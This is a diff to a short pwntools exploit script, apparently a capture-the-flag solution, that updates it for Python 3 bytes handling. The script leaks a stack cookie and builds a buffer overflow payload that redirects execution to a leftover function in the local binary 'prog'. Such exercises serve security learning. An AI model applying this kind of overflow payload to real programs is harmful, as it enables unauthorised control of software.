@@ -1,11 +1,11 @@
 from pwn import *
 
-e = ELF('prog')
-context.clear(arch=e.arch, endian=e.endian)
+context.binary = 'prog'
+e = context.binary
 
 p = e.process()
 
-p.readuntil(':\n')
+p.readuntil(b':\n')
 
 disclosed = []
 for i in range(9):
@@ -26,7 +26,7 @@ addr = e.sym.unused_remainder_from_old_version
 print(disclosed)
 print(addr)
 
-payload = 'A'
+payload = b'A'
 payload += pack(cookie)
 payload += pack(0)
 payload += pack(addr)
